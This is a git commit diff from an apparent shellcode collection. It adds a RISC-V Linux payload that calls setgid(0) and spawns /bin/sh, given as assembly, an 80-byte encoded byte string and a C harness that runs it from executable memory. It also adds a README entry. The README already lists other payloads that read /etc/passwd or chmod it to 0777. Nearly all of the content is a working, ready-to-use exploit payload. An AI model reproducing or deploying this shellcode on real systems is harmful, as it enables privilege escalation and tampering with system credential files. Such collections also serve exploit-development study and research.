bc3b00007cd9739c9a2d4ce476c478fe82e7d838
plvhx <foobar.github@gmail.com>
2025-06-09 15:53:38 +0700

    (*): Do slight changes.

---
+++ 5.c
@@ -0,0 +1,57 @@
+/*
+ * - arch: RISC-V (RV64I)
+ * - env: QEMU
+ * - uname: Linux debian 6.12.30-riscv64 #1 SMP Debian 6.12.30-1 (2025-05-28) riscv64 GNU/Linux
+ * - title: setgid(0) + execve("/bin/sh", NULL, NULL) 80 bytes shellcode
+ * - author: Paulus Gandung Prakosa <rvn.plvhx@gmail.com>
+ *
+ * [asm]
+ *   slt a7, x0, -1
+ *   li a7, 144
+ *   slt a0, x0, -1
+ *   ecall
+ *   slt a7, x0, -1
+ *   li a7, 221
+ *   slt a0, x0, -1
+ *   li a0, 0x69622f2f
+ *   sw a0, -12(sp)
+ *   li a0, 0x68732f6e
+ *   sw a0, -8(sp)
+ *   slt a6, x0, -1
+ *   sw a6, -4(sp)
+ *   slt a0, x0, -1
+ *   addi a0, sp, -12
+ *   slt a1, x0, -1
+ *   slt a2, x0, -1
+ *   ecall
+ * [/asm]
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/mman.h>
+
+static unsigned char *shellcode = "\x93\x28\xf0\xff\x93\x08\x00\x09\x13\x25\xf0\xff\x73\x00\x00\x00"
+                                  "\x93\x28\xf0\xff\x93\x08\xd0\x0d\x13\x25\xf0\xff\x37\x35\x62\x69"
+                                  "\x1b\x05\xf5\xf2\x23\x2a\xa1\xfe\x37\x35\x73\x68\x1b\x05\xe5\xf6"
+                                  "\x23\x2c\xa1\xfe\x13\x28\xf0\xff\x23\x2e\x01\xff\x13\x25\xf0\xff"
+                                  "\x13\x05\x41\xff\x93\x25\xf0\xff\x13\x26\xf0\xff\x73\x00\x00\x00";
+
+int main(void)
+{
+    void (*pcall)(int, int);
+
+    pcall = mmap(NULL, sysconf(_SC_PAGESIZE),
+                 PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+    if (pcall == MAP_FAILED) {
+        perror("mmap");
+        return -1;
+    }
+
+    memcpy(pcall, shellcode, 80);
+    pcall(0, 0);
+
+    return 0;
+}
--- README.md
+++ README.md
@@ -5,4 +5,5 @@
 - execve("/usr/bin/cat", ["/usr/bin/cat", "/etc/passwd", NULL], NULL) 144 bytes shellcode
 - chmod 0777 /etc/passwd 136 bytes shellcode
 - setuid(0) + execve("/bin/sh", NULL, NULL) 80 bytes shellcode
+- setgid(0) + execve("/bin/sh", NULL, NULL) 80 bytes shellcode
 ```
